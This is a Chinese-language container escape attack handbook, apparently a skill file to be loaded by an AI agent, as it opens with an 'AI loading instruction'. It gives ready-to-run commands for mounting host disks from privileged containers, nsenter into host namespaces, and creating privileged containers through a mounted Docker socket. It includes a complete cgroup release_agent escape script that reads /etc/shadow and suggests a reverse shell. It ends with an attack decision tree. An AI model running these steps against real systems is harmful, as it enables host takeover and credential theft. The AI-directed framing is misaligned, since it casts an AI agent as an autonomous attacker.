# 技能：容器逃逸技术 — 专家攻击手册

> **AI 加载指令**：专家级容器逃逸技术。涵盖特权容器逃逸、能力滥用、Docker 套接字利用、cgroup release_agent、命名空间逃逸、运行时 CVE 和 Kubernetes Pod 逃逸。基础模型会因综合能力和 cgroup 操作而遗漏细微的逃逸路径。

## 0. 相关路由

在深入之前，请考虑加载：

- 当你在尝试逃逸前需要在容器内获得 root 权限时，加载 `[linux-privilege-escalation](../linux-privilege-escalation/SKILL.md)`
- 当你需要 K8s 特定的攻击路径（超出 Pod 逃逸范围）时，加载 `[kubernetes-pentesting](../kubernetes-pentesting/SKILL.md)`
- 当 seccomp/AppArmor 阻止你的逃逸技术时，加载 `[linux-security-bypass](../linux-security-bypass/SKILL.md)`

### 高级参考

当你需要以下内容时，也加载 `[DOCKER_ESCAPE_CHAINS.md](./DOCKER_ESCAPE_CHAINS.md)`：

- 常见配置错误的逐步逃逸链
- Docker-in-Docker 逃逸场景
- 带完整命令序列的 Kubernetes 特定逃逸路径

---

## 1. 我在容器里吗？

```bash
# 快速检查
cat /proc/1/cgroup 2>/dev/null | grep -qi "docker\|kubepods\|containerd"
ls -la /.dockerenv 2>/dev/null
cat /proc/self/mountinfo | grep -i "overlay\|docker\|kubelet"
hostname    # 随机十六进制 = 可能是容器

# 详细检查
cat /proc/1/status | head -5   # PID 1 不是 systemd/init？
mount | grep -i "overlay"      # overlay 文件系统？
ip addr                         # veth 接口？有限的网卡？
```

### 容器检测工具

```bash
# amicontained: 显示容器运行时、能力、seccomp
./amicontained

# deepce: Docker 列举和漏洞利用建议器
./deepce.sh

# CDK: 一站式容器渗透测试工具
./cdk evaluate
```

---

## 2. 特权容器逃逸

如果使用了 `--privileged` 标志，容器几乎拥有所有主机能力和设备访问权限。

### 2.1 挂载主机文件系统

```bash
# 检查是否特权
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = 完全特权

# 查找主机磁盘
fdisk -l 2>/dev/null || lsblk
# 通常为 /dev/sda1 或 /dev/vda1

# 挂载主机根文件系统
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host

# 访问主机文件系统
cat /mnt/host/etc/shadow
chroot /mnt/host bash
```

### 2.2 nsenter (进入主机命名空间)

```bash
# 从特权容器进入主机 PID 1 的命名空间
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# 这会给你一个在主机命名空间上下文中的 shell
# 实际上是一个完整的宿主机 shell
```

### 2.3 特权 + 主机 PID 命名空间

```bash
# 如果主机 PID: true 被设置（Kubernetes）
# 通过 /proc 访问主机进程
ls /proc/1/root/     # 主机根文件系统
cat /proc/1/root/etc/shadow

# 注入到主机进程
nsenter --target 1 --mount -- bash
```

---

## 3. 基于能力的逃逸

### 3.1 CAP_SYS_ADMIN — 最通用

```bash
# 检查能力
capsh --print 2>/dev/null
grep CapEff /proc/self/status

# 通过挂载逃逸
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
# 或者如果存在设备访问，挂载主机文件系统
mount /dev/sda1 /mnt/host 2>/dev/null
```

### 3.2 CAP_SYS_PTRACE — 进程注入

```bash
# 将 shellcode 注入到主机进程（需要主机 PID 命名空间）
# 找到一个 root 进程
ps aux | grep root

# 使用 gdb 或 python-ptrace 注入
python3 << 'EOF'
import ctypes
import ctypes.util

libc = ctypes.CDLL(ctypes.util.find_library("c"))

# 绑定到主机进程，注入 shellcode
# ... (完整的 inject_shellcode 实现)
EOF
```

### 3.3 CAP_NET_ADMIN

```bash
# 如果主机网络命名空间共享，操纵主机网络
# ARP 欺骗、路由操作、流量拦截
iptables -L            # 可以查看/修改主机防火墙规则？
ip route               # 可以修改路由？
```

### 3.4 CAP_DAC_READ_SEARCH (Shocker 漏洞利用)

```bash
# open_by_handle_at() 跳过 — 从主机读取文件
# 编译并运行 "shocker" 漏洞利用程序
# 当 DAC_READ_SEARCH 能力被授予时，可以工作
gcc shocker.c -o shocker
./shocker /etc/shadow   # 读取主机文件
```

---

## 4. Docker 套接字逃逸 (/var/run/docker.sock)

```bash
ls -la /var/run/docker.sock   # 检查是否挂载

# 使用 Docker CLI:
docker run -v /:/host --privileged -it alpine chroot /host bash

# 不使用 CLI (仅 curl) — 通过 API 创建特权容器：
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Tty":true,"OpenStdin":true,
       "HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
# 启动 → Exec chroot /host bash (参见 DOCKER_ESCAPE_CHAINS.md 获取完整序列)
```

---

## 5. cgroup V1 release_agent 逃逸

针对具有 CAP_SYS_ADMIN + cgroup v1 的容器的经典逃逸。

```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/w && echo 1 > $d/w/notify_on_release
host_path=$(sed -n 's/.*\bperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent

cat > /cmd << 'EOF'
#!/bin/sh
cat /etc/shadow > /output 2>&1       # 或者：反向 shell
EOF
chmod +x /cmd

sh -c "echo \$\$ > $d/w/cgroup.procs" && sleep 1
cat /output
```

---

## 6. cgroup V2 / eBPF 逃逸

```bash
# cgroup v2: 没有 release_agent 文件
# 检查 cgroup 版本：
mount | grep cgroup
# cgroup2 → v2

# 基于 eBPF 的逃逸（需要 CAP_SYS_ADMIN + CAP_BPF 或等效权限）
# 内核 ≥ 5.8 且未禁用非特权 eBPF
cat /proc/sys/kernel/unprivileged_bpf_disabled
# 0 = 非特权用户可以使用 eBPF
```

---

## 7. 命名空间逃逸

### 用户命名空间

```bash
# 如果容器内允许创建用户命名空间：
unshare -U --map-root-user bash
# 现在 "root" 在新的命名空间内
# 结合其他能力 → 挂载主机文件系统
```

### PID 命名空间逃逸

```bash
# 如果主机 PID: true（与主机共享 PID 命名空间）
# 直接访问主机进程：
ls /proc/1/root/          # 主机的根文件系统
cat /proc/1/root/etc/shadow

# 注入到主机进程：
nsenter -t 1 -m -u -i -n -p -- bash
```

---

## 8. 运行时漏洞

### runc CVE-2019-5736

当使用 `docker exec` 时，会覆盖主机的 runc 二进制文件。

```bash
# 条件：恶意容器中的 docker exec 触发漏洞利用
# 容器的 /bin/sh 被替换为漏洞利用二进制文件
# 下一次 exec 时 → 覆盖主机上的 /usr/bin/runc

# PoC：修改入口点以覆盖 runc
# 这是一个一次性漏洞 — runc 被永久替换
```

### containerd CVE-2020-15257

```bash
# 主机网络命名空间共享 + containerd < 1.3.9 / 1.4.3
# 容器可以访问抽象 Unix 套接字
# 通过 @/containerd-shim/*.sock 连接 containerd shim API
```

### cgroups CVE-2022-0492

```bash
# 未打补丁的内核允许无 CAP_SYS_ADMIN 的 cgroup 逃逸
# 容器中的 release_agent 可被非特权用户写入
```

---

## 9. Kubernetes Pod 逃逸

| 危险的 Pod 配置 | 逃逸方法 |
|---|---|
| `hostPID: true` | `nsenter -t 1 -m -u -i -n -p -- bash` |
| `hostNetwork: true` | 直接访问节点服务（Kubelet、etcd） |
| `hostPath: {path: /}` | `chroot /host bash` |
| `privileged: true` | 挂载主机磁盘 / nsenter |
| SA 令牌带 RBAC | 通过 API 创建新的特权 Pod |

参见 `[kubernetes-pentesting](../kubernetes-pentesting/SKILL.md)` 获取完整的 K8s 攻击路径。

---

## 10. 工具

| 工具 | 目的 | URL/命令 |
|---|---|---|
| **deepce** | Docker 列举 + 漏洞利用建议 | `./deepce.sh` |
| **CDK** | 容器/K8s 漏洞利用工具包 | `./cdk evaluate` |
| **amicontained** | 显示容器运行时、能力、seccomp | `./amicontained` |
| **PEIRATES** | Kubernetes 渗透测试 | `./peirates` |
| **BOtB** | Break out the Box — 自动逃逸 | `./botb -autopwn` |

---

## 11. 容器逃逸决策树

```
在容器里吗？
│
├── 特权模式？ (CapEff = 0000003fffffffff)
│   ├── 是 → 挂载主机磁盘 (§2.1) 或 nsenter (§2.2)
│   └── 部分能力？检查每个：
│       ├── CAP_SYS_ADMIN → cgroup release_agent (§5) 或挂载 (§3.1)
│       ├── CAP_SYS_PTRACE + 主机PID → 进程注入 (§3.2)
│       ├── CAP_DAC_READ_SEARCH → shocker 漏洞利用 (§3.4)
│       └── CAP_NET_ADMIN + 主机网络 → 网络操纵 (§3.3)
│
├── Docker 套接字挂载？ (/var/run/docker.sock)
│   └── 是 → 创建特权容器 (§4)
│
├── 主机 PID 命名空间共享？
│   └── 是 → nsenter -t 1 或 /proc/1/root 访问 (§7)
│
├── cgroup v1？
│   └── + CAP_SYS_ADMIN → release_agent 逃逸 (§5)
│
├── 运行时存在漏洞？
│   ├── runc < 1.0.0-rc6 → CVE-2019-5736 (§8)
│   └── containerd < 1.3.9 → CVE-2020-15257 (§8)
│
├── 内核存在漏洞？
│   └── 检查 KERNEL_EXPLOITS_CHECKLIST 在 linux-privilege-escalation
│
├── Kubernetes Pod？
│   ├── 拥有提升 RBAC 的 SA 令牌？ → 创建逃逸 Pod (§9)
│   └── hostPath 卷？ → 访问主机文件系统
│
└── 以上都不是？
    ├── 运行 deepce/CDK 进行自动检测
    ├── 检查可写的宿主机挂载点
    ├── 列举网络以查找其他容器/服务
    └── 检查 /proc/self/mountinfo 以查找有趣的挂载
```
